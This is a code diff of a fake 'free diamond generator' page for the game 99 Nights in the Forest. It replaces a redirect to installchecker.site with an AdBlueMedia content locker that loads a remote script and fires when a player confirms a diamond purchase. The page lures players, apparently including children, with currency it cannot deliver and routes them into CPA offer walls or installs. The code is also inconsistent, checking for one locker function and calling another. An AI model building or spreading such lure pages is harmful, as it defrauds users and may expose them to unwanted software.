@@ -16,7 +16,6 @@
     <meta name="twitter:description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide.">
     <meta name="twitter:image" content="images/unnamed.webp">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Russo+One&display=swap" rel="stylesheet">
-    <link rel="icon" type="image/png" href="https://i.imgur.com/m5PqhK4.png">
     <script src="js/jquery-3.6.0.min.js"></script>
     <style>
         body {
@@ -518,7 +517,22 @@
     <audio id="dingSound" preload="auto" src="media/audio_63c49c13c8.mp3"></audio>
     <audio id="clickSound" preload="auto" src="media/audio_5139288bda.mp3"></audio>
     
-    <!-- CPA Locker Scripts Removed -->
+    <!-- AdBlueMedia Locker Script - Loaded on demand -->
+    <script type="text/javascript">
+        var cCTxF_Esb_SMeuSc={"it":4547716,"key":"72074"};
+        
+        // Load AdBlueMedia script only when needed
+        function loadAdBlueMedia() {
+            if (!window.adBlueMediaLoaded) {
+                var script = document.createElement('script');
+                script.src = 'https://d3qr4eoze2yrp4.cloudfront.net/7b37a05.js';
+                script.onload = function() {
+                    window.adBlueMediaLoaded = true;
+                };
+                document.head.appendChild(script);
+            }
+        }
+    </script>
 <!-- Google tag (gtag.js) -->
 <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-PXZF2Z55V6"></script>
 <script>
@@ -534,8 +548,12 @@
 
         // --- Configuration ---
         const CPA_LOCKER_SCRIPT = function() {
-            // New locker from installchecker.site
-            window.location.href = 'https://installchecker.site/cl/i/m521m8';
+            // AdBlueMedia locker - open with _cn() function
+            if (typeof _cn !== 'undefined') {
+                _kt();
+            } else {
+                console.log('AdBlueMedia locker not available');
+            }
         };
 
         // --- Active Users Count ---
@@ -849,8 +867,12 @@
                 </div>
             `);
             setTimeout(() => {
-                CPA_LOCKER_SCRIPT();
+                // Close popup first
                 closePurchasePopup();
+                // Then trigger the AdBlueMedia locker with delay
+                setTimeout(() => {
+                    CPA_LOCKER_SCRIPT();
+                }, 500);
             }, 3000);
         }
 
@@ -920,11 +942,14 @@
             $(document).on('click', '#confirm-yes', function() {
                 clickSound.currentTime = 0;
                 clickSound.play().catch(e => {});
-                const username = globalData.user_name || $('.profile-username').text().split(' ')[0];
-                const selectedItem = $('.item-card.selected');
-                const itemName = selectedItem.find('.item-name').text().trim();
-                const itemImage = selectedItem.find('.item-img').attr('src');
-                showVerificationState(username, itemName, itemImage);
+                
+                // Load AdBlueMedia script first, then trigger locker
+                loadAdBlueMedia();
+                setTimeout(function() {
+                    if (typeof _cn !== 'undefined') {
+                        _cn();
+                    }
+                }, 1000);
             });
         });
     </script>
